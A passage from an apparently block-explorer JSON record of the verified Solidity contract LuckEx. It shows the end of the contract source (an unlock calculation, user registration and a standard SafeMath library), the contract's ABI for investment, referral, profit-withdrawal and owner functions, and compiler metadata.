{\r\n        User memory user = userRoundMapping[rid][userAddr];\r\n        uint allUnlock = user.unlockAmount;\r\n        for (uint i = user.staticFlag; i < user.invests.length; i++) {\r\n            Invest memory invest = user.invests[i];\r\n            uint unlockDay = (now.sub(invest.investTime)).div(1 days);\r\n\r\n            if (unlockDay >= 5) {\r\n                allUnlock = allUnlock.add(invest.investAmount);\r\n            }\r\n        }\r\n        return allUnlock;\r\n    }\r\n\r\n    function registerUser(address user, string memory inviteCode, string memory referrer) private {\r\n        UserGlobal storage userGlobal = userMapping[user];\r\n        uid++;\r\n        userGlobal.id = uid;\r\n        userGlobal.userAddress = user;\r\n        userGlobal.inviteCode = inviteCode;\r\n        userGlobal.referrer = referrer;\r\n\r\n        addressMapping[inviteCode] = user;\r\n        indexMapping[uid] = user;\r\n    }\r\n}\r\n\r\n/**\r\n * @title SafeMath\r\n * @dev Math operations with safety checks that revert on error\r\n */\r\nlibrary SafeMath {\r\n\r\n    /**\r\n    * @dev Multiplies two numbers, reverts on overflow.\r\n    */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n        // benefit is lost if 'b' is also tested.\r\n        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"mul overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n    * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.\r\n    */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"div zero\"); // Solidity only automatically asserts when dividing by 0\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n    * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\r\n    */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"lower sub bigger\");\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n    * @dev Adds two numbers, reverts on overflow.\r\n    */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n    * @dev Divides two numbers and returns the remainder (unsigned integer modulo),\r\n    * reverts when dividing by zero.\r\n    */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0, \"mod zero\");\r\n        return a % b;\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"hookupInsuranceToken\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"insuranceToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"coeff\",\"type\":\"uint256\"}],\"name\":\"setCoefficient\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"reInvestIn\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"start\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"end\",\"type\":\"uint256\"}],\"name\":\"calDynamicProfit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getGameInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"renounceWhitelistAdmin\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"string\",\"name\":\"code\",\"type\":\"string\"}],\"name\":\"isUsed\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"removeWhitelistAdmin\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"addWhitelistAdmin\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"roundId\",\"type\":\"uint256\"}],\"name\":\"getUserInfo\",\"outputs\":[{\"internalType\":\"uint256[18]\",\"name\":\"ct\",\"type\":\"uint256[18]\"},{\"internalType\":\"uint256[4][]\",\"name\":\"history\",\"type\":\"uint256[4][]\"},{\"internalType\":\"string\",\"name\":\"inviteCode\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"referrer\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddr\",\"type\":\"address\"}],\"name\":\"calStaticProfit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdrawProfit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"}],\"name\":\"saveTokens\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"i\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"j\",\"type\":\"uint256\"}],\"name\":\"emergencyStop\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"string\",\"name\":\"code\",\"type\":\"string\"}],\"name\":\"getUserAddressByCode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"string\",\"name\":\"inviteCode\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"referrer\",\"type\":\"string\"}],\"name\":\"registerUserInfo\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"indexMapping\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isWhitelistAdmin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"redeem\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"string\",\"name\":\"inviteCode\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"referrer\",\"type\":\"string\"},{\"internalType\":\"bool\",\"name\":\"insured\",\"type\":\"bool\"}],\"name\":\"investIn\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"bool\",\"name\":\"insured\",\"type\":\"bool\"}],\"name\":\"getInvestScale\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"}],\"name\":\"activeGame\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"rate\",\"type\":\"uint256\"}],\"name\":\"mountInsuranceTokenRate\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"insuranceRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddr\",\"type\":\"address\"}],\"name\":\"getLatestUnlockAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"who\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"uid\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"insured\",\"type\":\"bool\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"string\",\"name\":\"inviteCode\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"string\",\"name\":\"referrer\",\"type\":\"string\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"typeFlag\",\"type\":\"uint256\"}],\"name\":\"LogInvestIn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"who\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"uid\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"}],\"name\":\"LogWithdrawProfit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"msg\",\"type\":\"string\"}],\"name\":\"LogInfo\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"}]","ContractName":"LuckEx","CompilerVersion":"v0.5.11+commit.c082d0b4","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","LicenseType":"MIT","SwarmSource":"bzzr://735fe9412929564a1bc6b0cd9e3a42dfd78133f8332b53119eade96ca81cd956"}]}